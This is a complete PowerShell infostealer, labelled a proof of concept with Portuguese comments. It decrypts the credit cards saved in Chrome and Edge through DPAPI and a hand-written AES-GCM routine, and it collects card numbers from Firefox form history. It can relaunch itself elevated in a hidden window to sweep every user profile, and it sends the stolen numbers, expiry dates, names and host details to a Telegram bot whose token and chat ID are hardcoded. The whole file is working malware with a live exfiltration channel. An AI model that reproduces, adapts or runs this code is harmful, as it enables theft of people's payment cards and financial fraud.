# =====================================================================
# POC Stealer v2 - PowerShell 5.1, sem modulos externos, literais ASCII
#
# Descriptografa os cartoes SALVOS nos navegadores do USUARIO ATUAL
# (sem admin) e envia ao Telegram em chunks de 4096 chars:
#   - Chrome/Edge: Web Data -> tabela credit_cards
#       chave AES-256 vem de "Local State" (os_crypt.encrypted_key)
#       -> base64 -> tira prefixo "DPAPI" -> DPAPI Unprotect -> 32 bytes
#       BLOB "v10" = v10 + nonce(12) + cipher + tag(16)  (AES-256-GCM)
#   - Firefox: formhistory.sqlite -> tabela formhistory (texto puro)
#
# Resultado: numero do cartao, validade (mm/aaaa), cvv (se salvo) e nome.
# =====================================================================
param(
  [switch]$DryRun,
  [switch]$NoTelegram,
  [switch]$Elevate,
  [switch]$ElevatedPass,
  [string]$TelegramToken = '8181336077:AAHhL3rtCxJovQl6F4xqMoiH7j9v6DZJnPM',
  [string]$TelegramChatId = '6168636325'
)

# ---------- Estado global ----------
$ErrorActionPreference = 'SilentlyContinue'
$scriptDir = Split-Path -Parent $PSCommandPath
if ($scriptDir) { [Environment]::CurrentDirectory = $scriptDir }   # p/ DllImport achar sqlite3.dll

# =====================================================================
# P/Invoke
# =====================================================================
# (1) SQLite - sqlite3.dll (ao lado do script)
Add-Type -Namespace Sqlite -Name Interop -MemberDefinition @'
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl, CharSet=CharSet.Unicode)]
public static extern int sqlite3_open16(string db, out IntPtr dbh);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int sqlite3_close(IntPtr dbh);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl, CharSet=CharSet.Unicode)]
public static extern int sqlite3_prepare16_v2(IntPtr dbh, string sql, int n, out IntPtr stmt, IntPtr tail);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int sqlite3_step(IntPtr stmt);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int sqlite3_column_type(IntPtr stmt, int i);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern IntPtr sqlite3_column_blob(IntPtr stmt, int i);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern long sqlite3_column_int64(IntPtr stmt, int i);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int sqlite3_column_bytes(IntPtr stmt, int i);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int sqlite3_data_count(IntPtr stmt);
[DllImport("sqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int sqlite3_finalize(IntPtr stmt);
'@

# (2) DPAPI - crypt32.dll
Add-Type -Namespace Win32 -Name Dpapi -MemberDefinition @'
[StructLayout(LayoutKind.Sequential)]
public struct DATA_BLOB { public int cbData; public IntPtr pbData; }
[DllImport("crypt32.dll", SetLastError=true)]
public static extern bool CryptUnprotectData(IntPtr pData, out string pszDescription, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDecryptedData);
'@

# (3) Token - advapi32.dll (p/ Test-Admin)
Add-Type -Namespace Win32 -Name Token -MemberDefinition @'
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
'@

$M = [System.Runtime.InteropServices.Marshal]
$CWD = 0x1   # CRYPTPROTECT_UI_FORBIDDEN
$blobSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][Win32.Dpapi+DATA_BLOB])

# =====================================================================
# DPAPI Unprotect (P/Invoke)
# =====================================================================
function Dpapi-Unprotect([byte[]]$data) {
  if ($null -eq $data -or $data.Length -eq 0) { return $null }
  $inPtr = $M::AllocHGlobal($data.Length)
  $M::Copy($data, 0, $inPtr, $data.Length)
  $inBlob = New-Object Win32.Dpapi+DATA_BLOB
  $inBlob.cbData = $data.Length
  $inBlob.pbData = $inPtr
  $inBlobPtr = $M::AllocHGlobal($blobSize)
  $M::StructureToPtr($inBlob, $inBlobPtr, $false)
  $decBlob = New-Object Win32.Dpapi+DATA_BLOB
  $desc = $null
  $ok = [Win32.Dpapi]::CryptUnprotectData($inBlobPtr, [ref]$desc, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $CWD, [ref]$decBlob)
  $M::FreeHGlobal($inPtr)
  $M::FreeHGlobal($inBlobPtr)
  if (-not $ok) { return $null }
  $out = New-Object byte[] $decBlob.cbData
  $M::Copy($decBlob.pbData, $out, 0, $decBlob.cbData)
  $M::FreeHGlobal($decBlob.pbData)
  return $out
}

# =====================================================================
# AES-256-GCM manual (CTR + GHASH em GF(2^128)) - validado em poc/test_gcm.ps1
# =====================================================================
function Aes-EcbBlock([byte[]]$key, [byte[]]$block16) {
  $aes = [System.Security.Cryptography.Aes]::Create()
  $aes.Key = $key
  $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
  $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
  $enc = $aes.CreateEncryptor()
  $out = New-Object byte[] 16
  [void]$enc.TransformBlock($block16, 0, 16, $out, 0)
  $enc.Dispose(); $aes.Dispose()
  return $out
}

# Multiplicacao em GF(2^128) - convencao GCM (R = 0xE1 no byte 0)
function Gf-Mul([byte[]]$X, [byte[]]$Y) {
  $Z = New-Object byte[] 16
  $V = $Y.Clone()
  for ($i = 0; $i -lt 128; $i++) {
    $byteIdx = [int][Math]::Floor($i / 8)
    $bitIdx = 7 - ($i % 8)
    if (((($X[$byteIdx] -shr $bitIdx) -band 1)) -eq 1) {
      for ($j = 0; $j -lt 16; $j++) { $Z[$j] = $Z[$j] -bxor $V[$j] }
    }
    $lowBit = $V[15] -band 1
    $carry = 0
    for ($j = 0; $j -lt 16; $j++) {
      $newCarry = $V[$j] -band 1
      $V[$j] = [byte](($V[$j] -shr 1) -bor ($carry -shl 7))
      $carry = $newCarry
    }
    if ($lowBit -eq 1) { $V[0] = $V[0] -bxor 0xE1 }
  }
  return $Z
}

function Gf-Ghash([byte[]]$H, [byte[]]$data) {
  $Y = New-Object byte[] 16
  for ($i = 0; $i -lt $data.Length; $i += 16) {
    $block = New-Object byte[] 16
    [Array]::Copy([byte[]]$data, $i, [byte[]]$block, 0, 16)
    for ($j = 0; $j -lt 16; $j++) { $block[$j] = $block[$j] -bxor $Y[$j] }
    $Y = Gf-Mul $block $H
  }
  return $Y
}

function Inc32([byte[]]$block) {
  $b = $block.Clone()
  for ($i = 15; $i -ge 12; $i--) {
    $b[$i] = $b[$i] + 1
    if ($b[$i] -ne 0) { break }
  }
  return $b
}

function Get-Keystream([byte[]]$key, [byte[]]$J0, [int]$length) {
  $ks = New-Object byte[] $length
  $counter = Inc32 $J0
  for ($i = 0; $i -lt $length; $i += 16) {
    $block = Aes-EcbBlock $key $counter
    $n = [Math]::Min(16, $length - $i)
    [Array]::Copy([byte[]]$block, 0, [byte[]]$ks, $i, $n)
    $counter = Inc32 $counter
  }
  return $ks
}

function Get-BitLenBlock([int]$byteLen) {
  # [bitlen]_64 = 8 bytes big-endian do bit-length
  $bits = [long]($byteLen * 8)
  $b = [BitConverter]::GetBytes($bits)
  if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($b) }
  return $b
}

function Pad-16([byte[]]$x) {
  $rem = $x.Length % 16
  if ($rem -eq 0) { return (New-Object byte[] 0) }
  return (New-Object byte[] (16 - $rem))
}

function Aes-Gcm-Decrypt([byte[]]$key, [byte[]]$iv, [byte[]]$ciphertext, [byte[]]$tag) {
  $zero = New-Object byte[] 16
  $H = Aes-EcbBlock $key $zero
  if ($iv.Length -eq 12) {
    # J0 = IV || 1^32 (esquema GCM padrao, validado contra cryptography/pycryptodome)
    $J0 = New-Object byte[] 16
    [Array]::Copy([byte[]]$iv, 0, [byte[]]$J0, 0, 12)
    $J0[15] = 1
  } else {
    $J0 = Gf-Ghash $H ($iv + (Pad-16 $iv) + (Get-BitLenBlock $iv.Length))
  }
  $ks = Get-Keystream $key $J0 $ciphertext.Length
  $plaintext = New-Object byte[] $ciphertext.Length
  for ($i = 0; $i -lt $ciphertext.Length; $i++) { $plaintext[$i] = $ciphertext[$i] -bxor $ks[$i] }
  # tag: GHASH(C || pad || [l_a]_64 || [l_c]_64) XOR AES_K(J0)  (l_a=0, sem AAD)
  $ghashInput = $ciphertext + (Pad-16 $ciphertext) + (Get-BitLenBlock 0) + (Get-BitLenBlock $ciphertext.Length)
  $S = Gf-Ghash $H $ghashInput
  $tagBlock = Aes-EcbBlock $key $J0
  $computedTag = New-Object byte[] 16
  for ($i = 0; $i -lt 16; $i++) { $computedTag[$i] = $tagBlock[$i] -bxor $S[$i] }
  $tagOk = $true
  for ($i = 0; $i -lt 16; $i++) { if ($computedTag[$i] -ne $tag[$i]) { $tagOk = $false; break } }
  return @{ Plaintext = $plaintext; TagOk = $tagOk }
}

# =====================================================================
# SQLite (via P/Invoke) - abre copia em temp p/ evitar lock do navegador
# =====================================================================
function Copy-DbToTemp([string]$src) {
  $tmp = Join-Path $env:TEMP ("cc_" + [guid]::NewGuid().ToString('N') + ".sqlite")
  try {
    $fs = New-Object System.IO.FileStream($src, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    $dst = New-Object System.IO.FileStream($tmp, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
    $fs.CopyTo($dst)
    $dst.Dispose(); $fs.Dispose()
    return $tmp
  } catch {
    [System.IO.File]::Copy($src, $tmp, $true)
    return $tmp
  }
}

function Get-ColCell([IntPtr]$stmt, [int]$c) {
  $type = [Sqlite.Interop]::sqlite3_column_type($stmt, $c)
  if ($type -eq 0) { return $null }   # NULL
  $cell = @{ Type = $type; Bytes = $null; Int = [long]0 }
  if ($type -eq 1) { $cell.Int = [long][Sqlite.Interop]::sqlite3_column_int64($stmt, $c) }
  $ptr = [Sqlite.Interop]::sqlite3_column_blob($stmt, $c)
  if ($ptr -ne [IntPtr]::Zero) {
    $len = [Sqlite.Interop]::sqlite3_column_bytes($stmt, $c)
    if ($len -gt 0) {
      $b = New-Object byte[] $len
      $M::Copy($ptr, $b, 0, $len)
      $cell.Bytes = $b
    }
  }
  return $cell
}

function Cell-Text($cell) {
  if ($null -eq $cell) { return '' }
  return [System.Text.Encoding]::UTF8.GetString($cell.Bytes)
}

function Cell-Int($cell) {
  if ($null -eq $cell) { return [long]0 }
  if ($cell.Type -eq 1) { return [long]$cell.Int }
  $b = $cell.Bytes
  if ($null -eq $b -or $b.Length -eq 0) { return [long]0 }
  $v = [long]0
  for ($i = 0; $i -lt $b.Length; $i++) { $v = ($v -shl 8) -bor $b[$i] }
  return $v
}

function Sqlite-Query([string]$dbPath, [string]$sql) {
  $rows = New-Object System.Collections.Generic.List[object]
  $dbh = [IntPtr]::Zero
  $rc = [Sqlite.Interop]::sqlite3_open16($dbPath, [ref]$dbh)
  if ($rc -ne 0 -or $dbh -eq [IntPtr]::Zero) { return $rows }
  $stmt = [IntPtr]::Zero
  $rc = [Sqlite.Interop]::sqlite3_prepare16_v2($dbh, $sql, -1, [ref]$stmt, [IntPtr]::Zero)
  if ($rc -ne 0) { [void][Sqlite.Interop]::sqlite3_close($dbh); return $rows }
  while (($step = [Sqlite.Interop]::sqlite3_step($stmt)) -eq 100) {   # 100 = SQLITE_ROW
    $nCols = [Sqlite.Interop]::sqlite3_data_count($stmt)
    $row = New-Object object[] $nCols
    for ($c = 0; $c -lt $nCols; $c++) { $row[$c] = Get-ColCell $stmt $c }
    $rows.Add($row)
  }
  [void][Sqlite.Interop]::sqlite3_finalize($stmt)
  [void][Sqlite.Interop]::sqlite3_close($dbh)
  return $rows
}

function Get-TableColumns([string]$dbPath) {
  $cols = New-Object System.Collections.Generic.List[string]
  $rows = Sqlite-Query $dbPath "PRAGMA table_info(credit_cards)"
  foreach ($r in $rows) {
    if ($r.Count -ge 2) {
      $name = Cell-Text $r[1]
      if ($name) { $cols.Add($name) }
    }
  }
  return $cols
}

# =====================================================================
# Descriptografia do BLOB "v10" (os_crypt)
# =====================================================================
function Decrypt-VCrypt([byte[]]$blob, [byte[]]$aesKey) {
  if ($null -eq $blob -or $blob.Length -lt 31) { return $null }
  $p0 = [char]$blob[0]; $p1 = [char]$blob[1]; $p2 = [char]$blob[2]
  if (-not (($p0 -eq 'v' -or $p0 -eq 'V') -and $p1 -eq '1' -and $p2 -eq '0')) { return $null }
  $nonce = New-Object byte[] 12
  [Array]::Copy($blob, 3, $nonce, 0, 12)
  $tag = New-Object byte[] 16
  [Array]::Copy($blob, $blob.Length - 16, $tag, 0, 16)
  $cipherLen = $blob.Length - 31
  if ($cipherLen -lt 0) { return $null }
  $cipher = New-Object byte[] $cipherLen
  [Array]::Copy($blob, 15, $cipher, 0, $cipherLen)
  $res = Aes-Gcm-Decrypt $aesKey $nonce $cipher $tag
  if (-not $res.TagOk) { return $null }
  return $res.Plaintext
}

# =====================================================================
# Helpers de exibicao
# =====================================================================
function Test-Luhn([string]$Number) {
  $d = $Number -replace '[^0-9]'
  if ($d.Length -lt 13 -or $d.Length -gt 19) { return $false }
  $sum = 0; $double = $false
  for ($i = $d.Length - 1; $i -ge 0; $i--) {
    $n = [int]$d[$i] - 48
    if ($double) { $n *= 2; if ($n -gt 9) { $n -= 9 } }
    $sum += $n; $double = -not $double
  }
  return ($sum % 10 -eq 0)
}

function Get-CardBrand([string]$d) {
  if ($d.StartsWith('4')) { return 'Visa' }
  if ($d -match '^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))') { return 'Mastercard' }
  if ($d -match '^3[47]') { return 'Amex' }
  if ($d -match '^(6011|62|64|65)') { return 'Discover' }
  if ($d -match '^(30[0-5]|36|38)') { return 'Diners' }
  return 'Desconhecida'
}

# Admin por NIVEL de token (TokenElevation, classe 19)
function Test-Admin {
  try {
    $PROCESS_QUERY_INFORMATION = 0x400
    $TokenElevation = 19
    $token = [IntPtr]::Zero
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    if (-not [Win32.Token]::OpenProcessToken($proc.Handle, $PROCESS_QUERY_INFORMATION, [ref]$token)) { return $false }
    $len = 0
    [void][Win32.Token]::GetTokenInformation($token, $TokenElevation, [IntPtr]::Zero, 0, [ref]$len)
    $buf = $M::AllocHGlobal($len)
    try {
      if ([Win32.Token]::GetTokenInformation($token, $TokenElevation, $buf, $len, [ref]$len)) {
        return $M::ReadInt32($buf) -eq 1
      }
      return $false
    } finally {
      $M::FreeHGlobal($buf)
    }
  } catch { return $false }
}

# =====================================================================
# Coleta: Chrome/Edge (credit_cards descriptografados)
# =====================================================================
function Get-ChromeEdgeCards([string]$userDataDir, [string]$BrowserName) {
  $cards = New-Object System.Collections.Generic.List[object]
  $localState = Join-Path $userDataDir 'Local State'
  if (-not (Test-Path $localState)) { return $cards }

  # 1) chave AES-256 a partir de Local State
  $ls = $null
  try { $ls = ([System.IO.File]::ReadAllText($localState)) | ConvertFrom-Json } catch { return $cards }
  $encKeyB64 = $ls.os_crypt.encrypted_key
  if (-not $encKeyB64) { return $cards }
  $encKeyB64 = $encKeyB64.Trim()
  $encKeyBytes = $null
  try { $encKeyBytes = [System.Convert]::FromBase64String($encKeyB64) } catch { return $cards }
  if ($encKeyBytes.Length -le 5) { return $cards }
  $dpapiData = New-Object byte[] ($encKeyBytes.Length - 5)
  [Array]::Copy($encKeyBytes, 5, $dpapiData, 0, $dpapiData.Length)
  $aesKey = Dpapi-Unprotect $dpapiData
  if ($null -eq $aesKey -or $aesKey.Length -ne 32) { return $cards }

  # 2) Web Data de cada perfil
  $webDataFiles = Get-ChildItem $userDataDir -Recurse -Filter 'Web Data' -File -ErrorAction SilentlyContinue
  foreach ($wd in $webDataFiles) {
    $profile = $wd.Directory.Name
    $tmp = Copy-DbToTemp $wd.FullName
    # detecta colunas (nomes variam por versao do Chrome/Edge)
    $colNames = Get-TableColumns $tmp
    $idxName = -1; $idxNum = -1; $idxMon = -1; $idxYr = -1
    for ($i = 0; $i -lt $colNames.Count; $i++) {
      $c = $colNames[$i]
      if ($c -eq 'name_on_card' -or $c -eq 'name') { if ($idxName -lt 0) { $idxName = $i } }
      if ($c -like 'card_number*' -or $c -eq 'number_encrypted') { if ($idxNum -lt 0) { $idxNum = $i } }
      if ($c -like 'expiration_month*') { if ($idxMon -lt 0) { $idxMon = $i } }
      if ($c -like 'expiration_year*') { if ($idxYr -lt 0) { $idxYr = $i } }
    }
    if ($idxNum -lt 0) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue; continue }
    $rows = Sqlite-Query $tmp 'SELECT * FROM credit_cards'
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    foreach ($r in $rows) {
      $name = if ($idxName -ge 0) { Cell-Text $r[$idxName] } else { '' }
      $num = ''
      if ($idxNum -ge 0 -and $r[$idxNum]) {
        $dec = Decrypt-VCrypt $r[$idxNum].Bytes $aesKey
        if ($dec) { $num = [System.Text.Encoding]::ASCII.GetString($dec) }
      }
      $mon = ''
      if ($idxMon -ge 0 -and $r[$idxMon]) {
        if ($r[$idxMon].Type -eq 1) { $mon = [string](Cell-Int $r[$idxMon]) }
        else { $dec = Decrypt-VCrypt $r[$idxMon].Bytes $aesKey; if ($dec) { $mon = [System.Text.Encoding]::ASCII.GetString($dec) } }
      }
      $yr = ''
      if ($idxYr -ge 0 -and $r[$idxYr]) {
        if ($r[$idxYr].Type -eq 1) { $yr = [string](Cell-Int $r[$idxYr]) }
        else { $dec = Decrypt-VCrypt $r[$idxYr].Bytes $aesKey; if ($dec) { $yr = [System.Text.Encoding]::ASCII.GetString($dec) } }
      }
      if ($num -eq '') { continue }
      $d = $num -replace '[^0-9]'
      $monDisp = $mon
      if ($mon -match '^\d+$') { $monDisp = ('{0:D2}' -f [int]$mon) }
      $cards.Add([pscustomobject]@{
        Source   = "$BrowserName / $profile"
        Number   = $num
        Digits   = $d
        Brand    = (Get-CardBrand $d)
        Exp      = if ($monDisp -and $yr) { "$monDisp/$yr" } else { '' }
        Name     = $name
        Cvv      = 'nao salvo'
      })
    }
  }
  return $cards
}

# =====================================================================
# Coleta: Firefox (formhistory, texto puro)
# =====================================================================
function Get-FirefoxCards([string]$profilesDir) {
  $cards = New-Object System.Collections.Generic.List[object]
  if (-not (Test-Path $profilesDir)) { return $cards }
  $fhFiles = Get-ChildItem $profilesDir -Recurse -Filter 'formhistory.sqlite' -File -ErrorAction SilentlyContinue
  foreach ($fh in $fhFiles) {
    $profile = $fh.Directory.Name
    $tmp = Copy-DbToTemp $fh.FullName
    $rows = Sqlite-Query $tmp "SELECT value FROM formhistory"
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    foreach ($r in $rows) {
      $val = Cell-Text $r[0]
      if ($val -eq '') { continue }
      $d = $val -replace '[^0-9]'
      if ($d.Length -ge 13 -and $d.Length -le 19 -and (Test-Luhn $d)) {
        $cards.Add([pscustomobject]@{
          Source = "Firefox / $profile (formhistory)"
          Number = $val
          Digits = $d
          Brand  = (Get-CardBrand $d)
          Exp    = ''
          Name   = ''
          Cvv    = ''
        })
      }
    }
  }
  return $cards
}

# =====================================================================
# Envio ao Telegram (chunks de 4096, UTF-8)
# =====================================================================
function Send-TelegramText([string]$Text, [string]$Token, [string]$ChatId) {
  $url = "https://api.telegram.org/bot$Token/sendMessage"
  if ([string]::IsNullOrEmpty($Text)) { return $true }
  $bodySize = 4096 - 10 - 1
  $n = [int][Math]::Ceiling($Text.Length / [double]$bodySize)
  if ($n -lt 1) { $n = 1 }
  $allOk = $true
  for ($i = 1; $i -le $n; $i++) {
    $start = ($i - 1) * $bodySize
    if ($start -ge $Text.Length) { break }
    $len = [Math]::Min($bodySize, $Text.Length - $start)
    $chunk = $Text.Substring($start, $len)
    $prefix = "[$i/$n] "
    $json = @{ chat_id = $ChatId; text = ($prefix + $chunk) } | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    try {
      [void](Invoke-RestMethod -Method Post -Uri $url -ContentType 'application/json; charset=utf-8' -Body $bytes)
    } catch {
      Write-Warning "TELEGRAM chunk $i/$n falhou: $($_.Exception.Message)"
      $allOk = $false
    }
    if ($i -lt $n) { Start-Sleep -Milliseconds 1100 }
  }
  return $allOk
}

# =====================================================================
# Formatacao do relatorio
# =====================================================================
function Format-Report([object[]]$Cards, [string]$HostName, [string]$User, [string]$OS, [string]$PSVer, [bool]$Admin) {
  $adminStr = if ($Admin) { 'sim' } else { 'nao' }
  $sb = New-Object System.Text.StringBuilder
  [void]$sb.AppendLine("=== POC STEALER v2 ===")
  [void]$sb.AppendLine("Host: $HostName")
  [void]$sb.AppendLine("User: $User")
  [void]$sb.AppendLine("OS: $OS")
  [void]$sb.AppendLine("PS: $PSVer")
  [void]$sb.AppendLine("Admin: $adminStr")
  [void]$sb.AppendLine("")
  [void]$sb.AppendLine("== CARTOES SALVOS ==")
  [void]$sb.AppendLine("Total: $($Cards.Count)")
  [void]$sb.AppendLine("")
  $idx = 0
  foreach ($c in $Cards) {
    $idx++
    [void]$sb.AppendLine("[$idx] $($c.Source)")
    [void]$sb.AppendLine("    numero:   $($c.Number)")
    if ($c.Exp) { [void]$sb.AppendLine("    validade: $($c.Exp)") }
    if ($c.Cvv) { [void]$sb.AppendLine("    cvv:      $($c.Cvv)") }
    if ($c.Name) { [void]$sb.AppendLine("    nome:     $($c.Name)") }
    [void]$sb.AppendLine("    bandeira: $($c.Brand)")
    [void]$sb.AppendLine("")
  }
  if ($Cards.Count -eq 0) { [void]$sb.AppendLine("(nenhum cartao salvo encontrado)") }
  return $sb.ToString()
}

# =====================================================================
# Fluxo principal
# =====================================================================
$hostName = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$psVer = $PSVersionTable.PSVersion.ToString()
$isAdmin = Test-Admin

# telegram.json ao lado do script (opcional): sobrescreve token/chat_id
if ($scriptDir) {
  $cfgPath = Join-Path $scriptDir 'telegram.json'
  if (Test-Path $cfgPath) {
    try {
      $cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json
      if ($cfg.token) { $TelegramToken = $cfg.token }
      if ($cfg.chat_id) { $TelegramChatId = $cfg.chat_id }
    } catch {
      Write-Warning "telegram.json: falha ao ler; usando defaults."
    }
  }
}

# autoelevacao opcional (UAC); nao-fatal se negada
if ($Elevate -and -not $isAdmin -and -not $ElevatedPass) {
  try {
    $argList = "-NoProfile -ExecutionPolicy Bypass -File `"$($PSCommandPath)`" -Elevate -ElevatedPass"
    Start-Process powershell -Verb RunAs -ArgumentList $argList -WindowStyle Hidden
    Write-Output "ELEVATE: relancado elevado; pai encerrando."
    exit 0
  } catch {
    Write-Warning "ELEVATE: UAC negado/falha; continuando sem elevacao."
  }
}

# usuarios a varrer
$users = @("$env:USERPROFILE")
if ($ElevatedPass) {
  $users = @()
  foreach ($u in (Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue)) { $users += $u.FullName }
}

$allCards = New-Object System.Collections.Generic.List[object]
foreach ($up in $users) {
  $chrome = Join-Path $up 'AppData\Local\Google\Chrome\User Data'
  $edge   = Join-Path $up 'AppData\Local\Microsoft\Edge\User Data'
  $ff     = Join-Path $up 'AppData\Roaming\Mozilla\Firefox\Profiles'
  if (Test-Path $chrome) { $allCards.AddRange((Get-ChromeEdgeCards $chrome 'Chrome')) }
  if (Test-Path $edge)   { $allCards.AddRange((Get-ChromeEdgeCards $edge 'Edge')) }
  if (Test-Path $ff)     { $allCards.AddRange((Get-FirefoxCards $ff)) }
}
$cards = @($allCards)

$report = Format-Report $cards $hostName $user $os $psVer $isAdmin

if ($DryRun) {
  Write-Output $report
  Write-Output "DRYRUN: cartoes=$($cards.Count) (sem envio ao Telegram)"
  exit 0
}
if ($NoTelegram) {
  Write-Output $report
  Write-Output "NOTELEGRAM: cartoes=$($cards.Count) (sem envio ao Telegram)"
  exit 0
}

$ok = Send-TelegramText -Text $report -Token $TelegramToken -ChatId $TelegramChatId
if ($ok) {
  Write-Output "OK: cartoes=$($cards.Count) telegram=OK"
  exit 0
} else {
  Write-Output "FALHA: cartoes=$($cards.Count) telegram=FALHA"
  exit 1
}
